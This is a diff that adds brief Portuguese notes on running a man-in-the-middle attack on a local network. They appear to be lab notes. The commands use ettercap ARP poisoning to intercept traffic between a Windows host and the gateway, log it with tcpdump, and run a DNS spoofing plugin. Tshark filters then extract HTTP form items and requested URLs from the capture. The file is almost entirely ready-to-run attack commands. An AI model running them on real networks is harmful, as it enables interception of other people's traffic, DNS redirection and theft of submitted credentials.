@@ -1,1 +1,48 @@
+Para capturar o tráfego entre o Kali Linux e o Gateway
+
+                                        ip kali      Gateway Padrão
+sudo ettercap -T -i eth0 -M arp:remote /192.168.0.9// /192.168.0.1//
+
+
+
+
+Para capturar o tráfego entre o Windows e o Gateway
+
+                                      ip do windons  Gateway Padrão
+sudo ettercap -T -i eth0 -M arp:remote /192.168.0.3// /192.168.0.1//
+
+
+salvar arquivo
+
+sudo ettercap -T -i eth0 -M arp:remote /192.168.0.3// /192.168.0.1// -L output_log
+
+
+
+sudo tcpdump -i eth0 -w capture.pcap -U -s 0 | tee /dev/tty | tcpdump -r capture.pcap -nn
+
+
+
+
 sudo ettercap -T -q -M arp:remote //192.168.0.1// //192.168.0.3// -i eth0 -P dns_spoof
+
+
+
+cat /etc/ettercap/etter.dns
+
+
+
+Abrir arquivo salvo: capture.pcap
+
+
+tshark -r capture.pcap -Y 'http' -V | grep -Ei 'Form item'  
+
+
+tshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri
+
+tshark -r capture.pcap -Y 'http' -V
+
+
+tcpdump -r capture.pcap
+
+
+
